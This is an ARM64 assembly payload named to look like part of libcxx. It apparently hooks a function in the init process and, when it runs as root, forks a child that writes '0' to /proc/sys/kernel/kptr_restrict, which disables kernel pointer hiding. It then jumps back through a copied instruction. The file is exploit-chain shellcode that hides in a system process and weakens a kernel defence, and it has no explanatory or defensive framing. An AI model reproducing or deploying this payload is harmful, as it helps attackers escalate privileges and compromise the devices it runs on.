.arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data

libcxx_data:

mutex_file:
    .asciz "/dev/df"
kptr_file:
    .asciz "/proc/sys/kernel/kptr_restrict"
zero_str:
    .asciz "0"
    .balign 4

    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int 0

    .align 4

libcxx_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // Detect root uid = 0
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    // Detect init tid = 1
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // Mutex: openat(AT_FDCWD, "/dev/df", O_CREAT|O_EXCL|O_CLOEXEC, 0)
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // return if fail to open (file exist)
    tbnz    w0, #31, return

    sub     sp, sp, 16

    // syscall(SYS_gettid);
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    // clone(CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD, 0, NULL, NULL, &ctid)
    mov     x8, SYS_clone
    add     x4, sp, 8           // ctid
    mov     x3, xzr             // newtls
    mov     x2, xzr             // ptid
    mov     x1, xzr             // stack
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
    str     w0, [sp, 8]         // save id
    add     sp, sp, 16

    cbnz    w0, return          // parent returns to init safely

    // ── worker child ──────────────────────────────────────────────────────
    sub     sp, sp, 32

    // openat(AT_FDCWD, "/proc/sys/kernel/kptr_restrict", O_WRONLY|O_CLOEXEC, 0)
    mov     x0, -100
    adr     x1, kptr_file
    movl    x2, (O_WRONLY|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // if (fd < 0) exit
    tbnz    w0, #31, myexit
    mov     x19, x0             // save fd to x19

    // write(fd, "0", 1)
    mov     x0, x19
    adr     x1, zero_str
    mov     x2, #1
    mov     x8, #SYS_write
    svc     0

    // close(fd)
    mov     x0, x19
    mov     x8, #SYS_close
    svc     0

    // unlinkat(AT_FDCWD, "/dev/df", 0)
    mov     x0, -100
    adr     x1, mutex_file
    mov     x2, xzr
    mov     x8, #SYS_unlinkat
    svc     0

myexit:
    mov     x0, #0
    mov     x8, #SYS_exit
    svc     0

return:
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
libcxx_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
